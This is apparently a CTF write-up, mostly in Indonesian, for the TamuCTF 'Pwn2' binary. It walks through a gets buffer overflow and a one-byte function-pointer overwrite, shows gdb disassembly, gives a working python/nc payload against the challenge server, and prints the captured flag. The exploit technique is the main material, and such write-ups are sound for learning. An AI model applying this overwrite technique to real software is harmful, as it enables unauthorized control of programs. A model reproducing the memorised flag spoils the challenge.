# __TamuCTF__
## _Pwn2_

## Information
**Category:** | **Points**
pwn | 356

**Description**

> nc pwn.tamuctf.com 4322
> Difficulty: easy
> [pwn2](./pwn2)

### Pwn2
#### File
```
pwn2: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=d126d8e3812dd7aa1accb16feac888c99841f504, not stripped
```

```
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL
```

#### Run
```
[l0l@l0l Pwn2]$ ./pwn2
ch function would you like to call?
aaaaa
```

#### Solve
Langsung coba buka di gdb. Ada beberapa fungsi yang kelihatannya menarik.
```
0x000006ad  two
0x000006d8  print_flag
0x00000754  one
0x0000077f  select_func
0x000007dc  main
```
Pada fungsi main, terdapat vuln buffer overflow. Tapi setelah dicek ternyata kita tidak dapat melakukan return ke fungsi lain karena programnya crash :(

Selain itu juga ada proteksi NX, PIE, dan RELRO.
```
   0x5655581a <+62>:    call   0x56555500 <puts@plt>
   0x5655581f <+67>:    add    esp,0x10
   0x56555822 <+70>:    sub    esp,0xc
   0x56555825 <+73>:    lea    eax,[ebp-0x27]
   0x56555828 <+76>:    push   eax
   0x56555829 <+77>:    call   0x565554e0 <gets@plt>
   0x5655582e <+82>:    add    esp,0x10
   0x56555831 <+85>:    sub    esp,0xc
   0x56555834 <+88>:    lea    eax,[ebp-0x27]
   0x56555837 <+91>:    push   eax
   0x56555838 <+92>:    call   0x5655577f <select_func>
```
Namun setelah itu fungsi main memanggil fungsi `select_func` dengan argumen input kita.
Coba lihat hasil disassembly fungsi `select_func`.

```
   0x5655578b <+12>:    add    ebx,0x182d
   0x56555791 <+18>:    lea    eax,[ebx-0x190b]
   0x56555797 <+24>:    mov    DWORD PTR [ebp-0xc],eax
   0x5655579a <+27>:    sub    esp,0x4
   0x5655579d <+30>:    push   0x1f
   0x5655579f <+32>:    push   DWORD PTR [ebp+0x8]
   0x565557a2 <+35>:    lea    eax,[ebp-0x2a]
   0x565557a5 <+38>:    push   eax
   0x565557a6 <+39>:    call   0x56555550 <strncpy@plt
   0x565557ab <+44>:    add    esp,0x10
   0x565557ae <+47>:    sub    esp,0x8
   0x565557b1 <+50>:    lea    eax,[ebx-0x1675]
   0x565557b7 <+56>:    push   eax
   0x565557b8 <+57>:    lea    eax,[ebp-0x2a]
   0x565557bb <+60>:    push   eax
   0x565557bc <+61>:    call   0x565554d0 <strcmp@plt>
   0x565557c1 <+66>:    add    esp,0x10
   0x565557c4 <+69>:    test   eax,eax
   0x565557c6 <+71>:    jne    0x565557d1 <select_func
   0x565557c8 <+73>:    lea    eax,[ebx-0x1864]
   0x565557ce <+79>:    mov    DWORD PTR [ebp-0xc],eax
   0x565557d1 <+82>:    mov    eax,DWORD PTR [ebp-0xc]
   0x565557d4 <+85>:    call   eax
```

Terlihat input kita dicopy sebanyak 0x1f bytes lalu dibandingkan dengan `$ebx-0x1675`. Coba lihat isinya :
```
gdb-peda$ x $ebx-0x1675
0x56555943:     "one"
```

Jika sama dengan "one" maka program akan memanggil $ebx-0x1864:
```
gdb-peda$ x $ebx-0x1864
0x56555754 <one>:       "U\211\345S\203\354\004\350", <incomplete sequence \357>
```
Disini terdapat vuln lain yaitu one-byte overflow, karena jarak antara `$ebp-0x2c` dengan `$ebp-0xc` adalah 30 bytes. Berarti kita dapat melakukan overwrite 1 byte `$ebp-0xc` (yang nantinya akan dipanggil). Kita dapat mengisinya dengan byte terakhir dari fungsi `print_flag`.

```
gdb-peda$ x print_flag
0x565556d8 <print_flag>:
```

#### Payload
```
python2 -c "print 'A'*30+'\xd8'" | nc pwn.tamuctf.com 4322
```

#### Result
```
[l0l@l0l Pwn2]$ python2 -c "print 'A'*30+'\xd8'" | nc pwn.tamuctf.com 4322

Which function would you like to call?
This function is still under development.
gigem{4ll_17_74k35_15_0n3}
```

#### Flag
gigem{4ll_17_74k35_15_0n3}
